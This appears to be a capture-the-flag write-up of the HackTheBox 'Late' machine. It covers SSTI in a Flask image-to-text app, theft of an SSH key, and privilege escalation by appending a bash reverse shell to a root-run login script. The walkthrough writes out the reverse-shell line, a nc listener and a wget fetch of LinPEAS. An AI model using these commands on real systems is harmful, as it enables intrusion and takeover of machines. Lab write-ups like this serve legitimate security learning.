# Configuration

If you're using your own machine like me, you have to access HTB network via `OpenVPN`:

```zsh
sudo openvpn lab_access_file.ovpn
```

It is very useful to append `/etc/hosts/` with ip address of the machine. It is useful to get subdomains and to not memorize the address every time.

```zsh
echo '10.10.11.156  late.htb' | sudo tee -a /etc/hosts
```

# Reconnaissance

## nmap scan

```zsh
nmap -sCV -oN nmap_scan late.htb
```

```

```
We see basic `ssh` and `http` here, let's explore the web application.

## Web application

![Web application](/assets/hackthebox/late/webapp.png)

In web apps, we can use `whatweb` tool to look which technologies are used in app.
```zsh
whatweb late.htb
```

```
http://late.htb [200 OK] Bootstrap[3.0.0], Country[RESERVED][ZZ], Email[#,support@late.htb], Google-API[ajax/libs/jquery/1.10.2/jquery.min.js], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.156], JQuery[1.10.2], Meta-Author[Sergey Pozhilov (GetTemplate.com)], Script, Title[Late - Best online image tools], nginx[1.14.0]
```

We have a basic home page and a contact page with nothing interesting. Also, on home page we have a link to `images.late.htb`, lets modify our `/etc/hosts` with that address to look at it:

> 10.10.11.156  late.htb images.late.htb

Now we navigate to images.late.htb:

![Web application subdomain](/assets/hackthebox/late/subdomain.png)

It is an image to text converter, we can see an `upload form` here, let's check how it works. It allows only `png` or `jpg` file formats. Generate some text converted into image, I used [this site](https://www.345tool.com/converter/text-to-image-converter) here. Then, upload the image and it will return result in a txt file.

![Flask app results](/assets/hackthebox/late/flask_app_results.png)

# user.txt

## Enumeration

Note that it is a `Flask` application, it means `Python` is used here. I've found that Flask uses `Jinja2`, which allows us to try python code injections. Let's try basic injection by putting `{% raw %}{{7*'7'}}{% endraw %}` into image.

![Code injection](/assets/hackthebox/late/code_injection.png)

It works! Now we have to test and prepare our payload... 

## Exploit

After 2 hours I found right font and font size, I think it's not worth for time I spent, seriously... Use Verdana font with size 24, it worked for me. At first, we try to read `/etc/passwd`.

![etc passwd](/assets/hackthebox/late/etc_passwd.png)

We can see an interesting line here:

```
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
```

Some user has a home directory and can log in. We can try to find `ssh` private key.

![We got a private key](/assets/hackthebox/late/private_key.png)

We're lucky! Now we copy key to file and log in! Don't forget to change file permissions.

```zsh
chmod 600 id_rsa
ssh -i id_rsa svc_acc@late.htb
cat user.txt
```

# root.txt

## Explore for privilige escalation

Let's upload [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and try to get possible privilege escalation vectors. On our machine we use `Python` to start a simple web server.

```zsh
python -m http.server 8000
```

On victim machine we use `wget` to download the script. Then, we change permissions to a file to make it executable and run it.

```bash
wget http://10.10.16.14:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![Possible privesc vector](/assets/hackthebox/late/priv_esc_vector.png)

LinPEAS has found an interesting file for us, let's read it and understand what it does.

```bash
cat /usr/local/sbin/ssh-alert.sh
```

```
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

We can see that the script runs every time when a ssh connection is established. The file is not writtable, but if we list attributes of it, we will see that we can `append` to the file.

```bash
lsattr ssh-alert.sh
```

```
-----a--------e--- ssh-alert.sh
```

We have to check who runs the script. When we just connected via ssh, we listed the home directory and saw an executable called `pspy`, this is a tool for `monitor` processes without root privileges. Execute the tool and open another terminal, then connect again via ssh, you will see the events.

![Monitor processes](/assets/hackthebox/late/monitor_processes.png)

We can see that ssh-alert.sh runs with `UID 0`, which means that file executes by root, luckly for us! 

## Privilege escalation

Now we know that the file is executed by root, so we can do a lot of things, for example, get a reverse shell. Let's append a simple bash reverse shell from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp). Note that we can't directly write in the file. Then we check if everything is good.

```bash
echo '/bin/bash -i >& /dev/tcp/10.10.16.14/6185 0>&1' >> /usr/local/sbin/ssh-alert.sh 
cat /usr/local/ssh-alert.sh
```

Open an another terminal to set up a listener:

```zsh
nc -lnvp 6185
```

Finally, connect via ssh to trigger the script.

```zsh
ssh -i id_rsa svc_acc@late.htb
```

Then, on our listener terminal we will get the connection from `root`! We got it!

![We got a root](/assets/hackthebox/late/root.png)

# Conclusion

It was a very interesting box, but searching for a font and a font size was terrible, really. It was cool to learn about Flask and pspy.

Thank you for reading, I hope it was useful for you ❤️
